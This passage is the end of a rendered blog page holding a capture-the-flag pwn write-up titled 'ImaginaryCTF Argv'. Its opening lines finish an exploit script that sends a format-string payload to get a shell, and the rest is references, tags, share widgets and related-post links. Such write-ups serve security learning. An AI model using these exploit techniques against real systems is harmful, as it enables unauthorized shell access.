+</span></span><span style="display:flex;"><span><span style="color:#e06c75">shell</span><span style="color:#56b6c2">=</span><span style="color:#98c379">b</span><span style="color:#98c379">&#34;%.&#34;</span><span style="color:#56b6c2">+</span> <span style="color:#e5c07b">str</span>(<span style="color:#e06c75">u16</span>(<span style="color:#98c379">b</span><span style="color:#98c379">&#39;sh&#39;</span>))<span style="color:#56b6c2">.</span><span style="color:#e06c75">encode</span>() <span style="color:#56b6c2">+</span> <span style="color:#98c379">b</span><span style="color:#98c379">&#34;?&#34;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">sendline</span>(<span style="color:#e06c75">shell</span>)
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">target</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">interactive</span>()
+</span></span></code></pre></div><p><img src="/images/ImaginaryCTF_-_Argv/Pasted_20241111201745.png" alt=""></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://linux.die.net/man/3/strchrnul"
+
+
+
+
+ target="_blank"
+ 
+
+
+>https://linux.die.net/man/3/strchrnul</a></li>
+<li><a href="https://maxwelldulin.com/BlogPost/House-of-Husk-In-Depth-Explanation"
+
+
+
+
+ target="_blank"
+ 
+
+
+>https://maxwelldulin.com/BlogPost/House-of-Husk-In-Depth-Explanation</a></li>
+<li><a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507"
+
+
+
+
+ target="_blank"
+ 
+
+
+>https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></li>
+</ul>
+
+          </div>
+          <div class="row items-start justify-between">
+            
+            
+              <div class="lg:col-6 mb-10 flex items-center lg:mb-0">
+                <h5 class="mr-3">Tags :</h5>
+                <ul>
+                  
+                    <li class="inline-block">
+                      <a
+                        class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white"
+                        href="/tags/linux/">
+                        Linux
+                      </a>
+                    </li>
+                  
+                    <li class="inline-block">
+                      <a
+                        class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white"
+                        href="/tags/formatstring/">
+                        Format string
+                      </a>
+                    </li>
+                  
+                    <li class="inline-block">
+                      <a
+                        class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white"
+                        href="/tags/gotoverwrite/">
+                        Got overwrite
+                      </a>
+                    </li>
+                  
+                    <li class="inline-block">
+                      <a
+                        class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white"
+                        href="/tags/houseofhusk/">
+                        Houseof husk
+                      </a>
+                    </li>
+                  
+                    <li class="inline-block">
+                      <a
+                        class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white"
+                        href="/tags/libcgotoverwrite/">
+                        Libc got overwrite
+                      </a>
+                    </li>
+                  
+                    <li class="inline-block">
+                      <a
+                        class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white"
+                        href="/tags/stackleak/">
+                        Stack leak
+                      </a>
+                    </li>
+                  
+                </ul>
+              </div>
+            
+            <div class="lg:col-6 flex items-center lg:justify-end">
+              <h5>Share :</h5>
+              
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="share-icons">
+  
+  
+    <a
+      class="share-link share-facebook"
+      href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2fblog%2fimaginaryctf%2fargv%2f"
+      target="_blank"
+      rel="noopener"
+      aria-label="share facebook">
+      <span class="share-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path
+            d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z" />
+        </svg>
+      </span>
+    </a>
+  
+
+
+  
+  
+    <a
+      class="share-link share-x"
+      href="https://x.com/intent/tweet/?text=ImaginaryCTF%20Argv%20Pwn%20Writeup&amp;url=%2f%2flocalhost%3a1313%2fblog%2fimaginaryctf%2fargv%2f"
+      target="_blank"
+      rel="noopener"
+      aria-label="share x">
+      <span aria-hidden="true" class="share-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path
+            d="M8 2H1l8.26 11.015L1.45 22H4.1l6.388-7.349L16 22h7l-8.608-11.478L21.8 2h-2.65l-5.986 6.886zm9 18L5 4h2l12 16z" />
+        </svg>
+      </span>
+    </a>
+  
+
+
+  
+  
+    <a
+      class="share-link share-email"
+      href="mailto:?subject=ImaginaryCTF%20Argv%20Pwn%20Writeup&amp;body=%2f%2flocalhost%3a1313%2fblog%2fimaginaryctf%2fargv%2f"
+      target="_self"
+      rel="noopener"
+      aria-label="share email">
+      <span aria-hidden="true" class="share-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path
+            d="M22 4H2C.9 4 0 4.9 0 6v12c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM7.25 14.43l-3.5 2c-.08.05-.17.07-.25.07-.17 0-.34-.1-.43-.25-.14-.24-.06-.55.18-.68l3.5-2c.24-.14.55-.06.68.18.14.24.06.55-.18.68zm4.75.07c-.1 0-.2-.03-.27-.08l-8.5-5.5c-.23-.15-.3-.46-.15-.7.15-.22.46-.3.7-.14L12 13.4l8.23-5.32c.23-.15.54-.08.7.15.14.23.07.54-.16.7l-8.5 5.5c-.08.04-.17.07-.27.07zm8.93 1.75c-.1.16-.26.25-.43.25-.08 0-.17-.02-.25-.07l-3.5-2c-.24-.13-.32-.44-.18-.68s.44-.32.68-.18l3.5 2c.24.13.32.44.18.68z" />
+        </svg>
+      </span>
+    </a>
+  
+
+
+  
+  
+
+
+  
+  
+
+
+  
+  
+
+
+  
+  
+
+
+  
+  
+
+
+  
+  
+
+
+  
+  
+
+
+  
+  
+    <span class="fediverse-share">
+      <a
+        class="share-link share-fediverse"
+        href="javascript:void(0);"
+        onclick="toggleFediverseInput(this)"
+        aria-label="share fediverse">
+        <span aria-hidden="true" class="share-icon">
+          <svg
+            viewBox="-10 -5 1034 1034"
+            xmlns="http://www.w3.org/2000/svg"
+            xmlns:xlink="http://www.w3.org/1999/xlink"
+            version="1.1">
+            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+            <g
+              id="SVGRepo_tracerCarrier"
+              stroke-linecap="round"
+              stroke-linejoin="round"></g>
+            <g id="SVGRepo_iconCarrier">
+              <path
+                d="M539 176q-32 0 -55 22t-25 55t20.5 58t56 27t58.5 -20.5t27 -56t-20.5 -59t-56.5 -26.5h-5zM452 271l-232 118q20 20 25 48l231 -118q-19 -20 -24 -48zM619 298q-13 25 -38 38l183 184q13 -25 39 -38zM477 320l-135 265l40 40l143 -280q-28 -5 -48 -25zM581 336 q-22 11 -46 10l-8 -1l21 132l56 9zM155 370q-32 0 -55 22.5t-25 55t20.5 58t56.5 27t59 -21t26.5 -56t-21 -58.5t-55.5 -27h-6zM245 438q1 9 1 18q-1 19 -10 35l132 21l26 -50zM470 474l-26 51l311 49q-1 -8 -1 -17q1 -19 10 -36zM842 480q-32 1 -55 23t-24.5 55t21 58 t56 27t58.5 -20.5t27 -56.5t-20.5 -59t-56.5 -27h-6zM236 493q-13 25 -39 38l210 210l51 -25zM196 531q-21 11 -44 10l-9 -1l40 256q21 -10 45 -9l8 1zM560 553l48 311q21 -10 44 -9l10 1l-46 -294zM755 576l-118 60l8 56l135 -68q-20 -20 -25 -48zM781 625l-119 231 q28 5 48 25l119 -231q-28 -5 -48 -25zM306 654l-68 134q28 5 48 25l60 -119zM568 671l-281 143q19 20 24 48l265 -135zM513 771l-51 25l106 107q13 -25 39 -38zM222 795q-32 0 -55.5 22.5t-25 55t21 57.5t56 27t58.5 -20.5t27 -56t-20.5 -58.5t-56.5 -27h-5zM311 863 q2 9 1 18q-1 19 -9 35l256 41q-1 -9 -1 -18q1 -18 10 -35zM646 863q-32 0 -55 22.5t-24.5 55t20.5 58t56 27t59 -21t27 -56t-20.5 -58.5t-56.5 -27h-6z"></path>
+            </g>
+          </svg>
+        </span>
+      </a>
+      <span class="fediverse-input-wrapper" style="display: none;">
+        <input
+          type="text"
+          placeholder="Enter Fediverse Instance URL"
+          class="fediverse-input"
+          onkeypress="handleFediverseShare(event, '\/\/localhost:1313\/blog\/imaginaryctf\/argv\/', 'ImaginaryCTF Argv Pwn Writeup')" />
+        <button
+          class="fediverse-check-button"
+          onclick="handleFediverseShareButton(this, '\/\/localhost:1313\/blog\/imaginaryctf\/argv\/', 'ImaginaryCTF Argv Pwn Writeup')">
+          Share
+        </button>
+      </span>
+    </span>
+  
+
+
+  
+  
+    <button
+      class="share-link share-copy"
+      onclick="copyToClipboard(this, '\/\/localhost:1313\/blog\/imaginaryctf\/argv\/')">
+      <span class="share-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path
+            d="M19 3h-4.18C14.4 1.84 13.3 1 12 1s-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7-1c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 17H5V5h14v14z" />
+        </svg>
+      </span>
+    </button>
+  
+
+</div>
+
+<script>
+  
+  function toggleFediverseInput(element) {
+    const container = element.closest(".fediverse-share");
+    const inputContainer = container.querySelector(".fediverse-input-wrapper");
+    inputContainer.style.display =
+      inputContainer.style.display === "none" ? "block" : "none";
+  }
+
+  
+  function handleFediverseShare(event, url, title) {
+    if (event.key === "Enter") {
+      const input = event.target;
+      let instanceUrl = input.value.trim();
+      if (instanceUrl) {
+        if (!instanceUrl.startsWith("https://")) {
+          instanceUrl = `https://${instanceUrl}`;
+        }
+        const shareUrl = `${instanceUrl}/share?text=${encodeURIComponent(title)}&url=${encodeURIComponent(url)}`;
+        window.open(shareUrl, "_blank", "noopener");
+      }
+    }
+  }
+
+  
+  function handleFediverseShareButton(button, url, title) {
+    const input = button.previousElementSibling;
+    let instanceUrl = input.value.trim();
+    if (instanceUrl) {
+      if (!instanceUrl.startsWith("https://")) {
+        instanceUrl = `https://${instanceUrl}`;
+      }
+      const shareUrl = `${instanceUrl}/share?text=${encodeURIComponent(title)}&url=${encodeURIComponent(url)}`;
+      window.open(shareUrl, "_blank", "noopener");
+    }
+  }
+
+  
+  function copyToClipboard(button, text) {
+    navigator.clipboard.writeText(text).then(() => {
+      const icon = button.querySelector("svg path");
+      const originalIconPath =
+        "M19 3h-4.18C14.4 1.84 13.3 1 12 1s-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7-1c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 17H5V5h14v14z";
+      const checkIconPath =
+        "M9 16.2l-3.5-3.5-1.4 1.4L9 19 20 8l-1.4-1.4L9 16.2z";
+
+      
+      icon.setAttribute("d", checkIconPath);
+
+      
+      setTimeout(() => {
+        icon.setAttribute("d", originalIconPath);
+      }, 1000);
+    });
+  }
+</script>
+
+            </div>
+          </div>
+          
+          
+            <div class="mt-20">
+              <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "themefisher-template" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+          
+        </article>
+      </div>
+
+      
+      
+      
+      
+        <div class="section pb-0">
+          <h2 class="h3 mb-12">Related Posts</h2>
+          <div class="row">
+            
+              <div class="lg:col-4 md:col-6 mb-14">
+                <div class="bg-body dark:bg-darkmode-body">
+  
+  
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  
+    
+      
+    
+
+
+    
+    
+
+
+    
+    
+      
+      
+    
+    
+    
+
+
+    
+    
+      
+      
+        
+
+        
+        
+        
+        
+        
+        
+        
+
+
+        
+        
+
+
+        <picture>
+          <source
+            
+              srcset="/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_9cf6a42dbd7c6974.webp"
+            
+            media="(max-width: 575px)" />
+          <source
+            
+              srcset="/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_8743e8561dd8e1ef.webp"
+            
+            media="(max-width: 767px)" />
+          <source
+            
+              srcset="/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_28b8a5b7e3561fd8.webp"
+            
+            media="(max-width: 991px)" />
+          <source
+            
+              srcset="/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_88543f4bd461388a.webp"
+             />
+          <img
+            
+              loading="lazy" decoding="async"
+              src="/images/ShmooconCTF/Pasted%20image%2020240113184503_hu_f4febf90c2966447.png"
+            class=" mb-6 w-full rounded img"
+            alt="ShmooCon CTF"
+            width="1179"
+            height="551" />
+        </picture>
+      
+      
+    
+    
+  
+
+
+  
+
+
+  
+  <h4 class="mb-3">
+    <a href="/blog/shmooconctf/shmooconctf/">
+      ShmooCon CTF
+    </a>
+  </h4>
+  
+  
+    <ul class="mb-4">
+      <li class="mr-4 inline-block">
+        <a href="/authors/zerofrost/">
+          <i class="fa-regular fa-circle-user mr-2"></i>zerofrost
+        </a>
+      </li>
+      <li class="mr-4 inline-block">
+        <i class="fa-regular fa-folder mr-1"></i>
+        
+          <a
+            href="/categories/ctf/"
+            class="ms-1"
+            >Ctf
+          </a>
+        
+      </li>
+    </ul>
+  
+  <p class="mb-6">Over the recent weekend, I found some free time that enabled me to participate in the ShmooCon CTF. While it did not have pwn challenges as I had hoped, they offered a variety of challenges I enjoyed solving. This blogpost is a walkthrough of some of the challenges I managed to solve.
+</p>
+  <a class="btn btn-outline-primary btn-sm" href="/blog/shmooconctf/shmooconctf/">
+    Read More
+  </a>
+</div>
+
+              </div>
+            
+              <div class="lg:col-4 md:col-6 mb-14">
+                <div class="bg-body dark:bg-darkmode-body">
+  
+  
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  
+    
+      
+    
+
+
+    
+    
+
+
+    
+    
+      
+      
+    
+    
+    
+
+
+    
+    
+      
+      
+        
+
+        
+        
+        
+        
+        
+        
+        
+
+
+        
+        
+
+
+        <picture>
+          <source
+            
+              srcset="/images/CrewCtf_Writeups/01_hu_58e35c1cf2ae95e1.webp"
+            
+            media="(max-width: 575px)" />
+          <source
+            
+              srcset="/images/CrewCtf_Writeups/01_hu_fcd1713ab4661ea3.webp"
+            
+            media="(max-width: 767px)" />
+          <source
+            
+              srcset="/images/CrewCtf_Writeups/01_hu_5dcd1420a269c5e5.webp"
+            
+            media="(max-width: 991px)" />
+          <source
+            
+              srcset="/images/CrewCtf_Writeups/01_hu_e608ea8504102a32.webp"
+             />
+          <img
+            
+              loading="lazy" decoding="async"
+              src="/images/CrewCtf_Writeups/01_hu_f53fd9d45ac7f35b.jpg"
+            class=" mb-6 w-full rounded img"
+            alt="CrewCtf Writeups"
+            width="1146"
+            height="574" />
+        </picture>
+      
+      
+    
+    
+  
+
+
+  
+
+
+  
+  <h4 class="mb-3">
+    <a href="/blog/crewctf_writeups/2023-07-11-crewctf-writeups/">
+      CrewCtf Writeups
+    </a>
+  </h4>
+  
+  
+    <ul class="mb-4">
+      <li class="mr-4 inline-block">
+        <a href="/authors/zerofrost/">
+          <i class="fa-regular fa-circle-user mr-2"></i>zerofrost
+        </a>
+      </li>
+      <li class="mr-4 inline-block">
+        <i class="fa-regular fa-folder mr-1"></i>
+        
+          <a
+            href="/categories/ctf/"
+            class="ms-1"
+            >Ctf
+              ,
+            
+          </a>
+        
+          <a
+            href="/categories/crewctf/"
+            class="ms-1"
+            >Crewctf
+          </a>
+        
+      </li>
+    </ul>
+  
+  <p class="mb-6">It has been a while since I last participated in a CTF (Capture The Flag) competition. With a few moments to spare this weekend, I decided to immerse myself in CrewCTF by theHackersCrew CTF team. Their event offered a diverse range of challenges, but I chose to focus primarily on the fascinating field of forensics. In this blog, I will share my approach and solutions for the different challenges I managed to solve.
+</p>
+  <a class="btn btn-outline-primary btn-sm" href="/blog/crewctf_writeups/2023-07-11-crewctf-writeups/">
+    Read More
+  </a>
+</div>
+
+              </div>
+            
+          </div>
+        </div>
+      
+    </div>
+  </section>
+
+    </main>
+
+    
+    <footer class="bg-light dark:bg-darkmode-light">
+  <div class="container">
+    <div class="row items-center py-10">
+      <div class="lg:col-3 mb-8 text-center lg:mb-0 lg:text-left">
+        
+        <a
+          class="navbar-brand inline-block"
+          href="/">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  zerofrost
+
+
+        </a>
+      </div>
+      <div class="lg:col-6 mb-8 text-center lg:mb-0">
+        <ul>
+          
+            <li class="m-3 inline-block">
+              <a
+                
+                href="
+                  /about
+                "
+                >About</a
+              >
+            </li>
+          
+        </ul>
+      </div>
+      <div class="lg:col-3 mb-8 text-center lg:mb-0 lg:mt-0 lg:text-right">
+        <ul class="social-icons">
+          
+            <li>
+              <a
+                target="_blank"
+                aria-label="facebook"
+                rel="nofollow noopener"
+                href="https://www.facebook.com/">
+                <i class="fab fa-facebook"></i>
+              </a>
+            </li>
+          
+            <li>
+              <a
+                target="_blank"
+                aria-label="twitter"
+                rel="nofollow noopener"
+                href="https://twitter.com/xubzer0">
+                <i class="fab fa-twitter"></i>
+              </a>
+            </li>
+          
+            <li>
+              <a
+                target="_blank"
+                aria-label="github"
+                rel="nofollow noopener"
+                href="https://www.github.com/allannjuguna">
+                <i class="fab fa-github"></i>
+              </a>
+            </li>
+          
+            <li>
+              <a
+                target="_blank"
+                aria-label="linkedin"
+                rel="nofollow noopener"
+                href="https://www.linkedin.com/">
+                <i class="fab fa-linkedin"></i>
+              </a>
+            </li>
+          
+        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="border-border dark:border-darkmode-border border-t py-7">
+    <div
+      class="text-text-light dark:text-darkmode-text-light container text-center">
+      <p>
+        Powered by Hugo
+      </p>
+    </div>
+  </div>
+</footer>
+
+
+
+    
+    
+
+
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+  
+    
+      
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+<script
+  crossorigin="anonymous"
+  integrity=""
+  src="/js/script.js"></script>
+
+
+<script
+  defer
+  async
+  crossorigin="anonymous"
+  integrity=""
+  src="/js/script-lazy.js"></script>
+
+
+
+<script>
+  if ('serviceWorker' in navigator){navigator.serviceWorker.register("/service-worker.js");}
+</script>
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  </body>
+</html>
